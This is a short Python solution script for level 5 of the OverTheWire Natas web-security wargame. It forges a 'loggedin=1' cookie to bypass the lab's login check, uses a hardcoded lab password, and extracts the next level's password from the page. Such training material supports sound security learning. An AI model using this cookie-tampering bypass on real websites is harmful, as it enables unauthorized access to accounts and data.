import requests
import re

#change coocki 0 to 1 and login with session
# level 4 => 5

Username = "natas5"
Password = "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"

cookies = { "loggedin": "1"}

session = requests.session()
url = "http://{}.natas.labs.overthewire.org/".format(Username) 

response = session.get(url,auth=(Username,Password),cookies = cookies)

content = response.text



#print(content)
flag = re.findall('Access granted. The password for natas6 is (.*)</div>',content)[0]
print(flag)